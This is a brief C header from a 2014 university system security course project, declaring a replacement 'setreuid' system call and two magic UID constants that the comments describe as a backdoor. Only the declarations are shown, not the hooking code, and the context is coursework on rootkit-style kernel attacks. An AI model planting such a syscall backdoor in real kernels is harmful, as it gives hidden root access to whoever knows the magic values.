/**********************************************************
	Last Updated: Nov 16, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Headers for backdoor 'setreuid' system call
***********************************************************/

asmlinkage long 
my_setreuid(uid_t ruid, uid_t euid);

#define BACKDOOR_RUID 1234
#define BACKDOOR_EUID 5678